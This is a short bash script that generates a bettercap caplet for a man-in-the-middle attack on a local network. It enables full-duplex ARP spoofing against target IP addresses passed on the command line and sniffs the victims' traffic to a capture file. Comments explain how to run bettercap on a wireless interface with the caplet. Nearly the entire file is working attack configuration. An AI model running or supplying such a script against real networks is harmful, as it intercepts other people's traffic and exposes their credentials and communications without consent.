#!/bin/bash

source /root/Desktop/programs/help_menu.sh

bettercap_path="/usr/share/bettercap/caplets/spoof.cap"
#help menu
if [ $# -eq 1 ] && [ $1 == "-h" ]
then
	help_menu '$0 [ip_of_target]\nbspoof 192.168.0.12,192.168.0.13\nbettercap -iface wlan0 -caplet /usr/share/bettercap/caplets/spoof.cap'
	exit 0
elif [ $1 != "-h" ]
then	#check if there is only one parameter so that $1 can be called and used

#will create a file called spoof.cap
echo "net.probe on" > $bettercap_path
#echo "net.recon on" >> $bettercap_path
echo "set arp.spoof.fullduplex true" >> $bettercap_path
echo "set arp.spoof.targets $1" >> $bettercap_path 
echo "arp.spoof on" >> $bettercap_path
echo "set net.sniff.local true" >> $bettercap_path
echo "set net.sniff.output /root/Desktop/capturefile.cap" >> $bettercap_path
echo "net.sniff on" >> $bettercap_path
#echo "set events.stream.output /root/Desktop/out.log" >> $bettercap_path
#echo "events.stream on" >> $bettercap_path

else
	echo "try: $0 -h"
fi

#errors that can occur: this will not check if the string that is coming in is valid meaning you can do something like bspoof ,, and it will just write ,, into the file
#usage after creating the file spoof.cap what do you do then?
	#bettercap -iface wlan0 -caplet /usr/share/bettercap/caplets/spoof.cap
		#note here that you will not be able to run a txt file such as $bettercap -iface wlan0 -caplet file.txt
		#it need to end with .cap such as filename.cap or else bettercap will look for the filename file.txt.cap. this will cause an error.
